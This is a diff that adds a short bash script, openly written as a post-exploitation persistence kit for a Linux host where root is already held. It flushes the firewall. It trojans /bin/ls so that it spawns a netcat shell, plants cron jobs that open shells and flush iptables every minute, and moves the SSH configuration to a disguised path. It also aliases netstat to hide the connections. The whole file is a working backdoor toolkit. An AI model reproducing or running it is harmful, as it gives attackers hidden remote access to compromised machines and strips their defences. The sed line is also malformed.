@@ -1,0 +1,30 @@
+#!/bin/bash
+#
+#By: Russell Babarsky
+#Throw this into /bin and chmod 777. Script assumes you already have root.
+#Script creates many forms of persistance on the box. Pretty basic tbh famalam.
+#
+
+#Prereqs
+iptables -F
+iptables -t mangle -F
+
+#change ls to a bad ls
+mv /bin/ls /bin/rls
+touch /bin/ls
+echo "nc -l -p $RANDOM -e /bin/bash" >> /bin/ls
+echo "ls" >> /bin/ls
+chmod 777 /bin/ls
+
+#change default ssh_config
+cp /etc/ssh/sshd_config /var/kworker
+sed 's/SSHD_OPTS=/SSHD_OPTS="-f /var/kworker"' /etc/default/ssh
+
+#crontab stuff
+echo "*/1 * * * * root nc -l -p $RANDOM -e /bin/sh" >> /etc/crontab
+echo "*/1 * * * * root iptables -F" >> /etc/crontab
+echo "*/1 * * * * root iptables -t mangle -F" >> /etc/crontab
+
+#hiding connections within netstat
+echo "alias netstat='netstat | grep -v nc'" >> ~/.bashrc
+
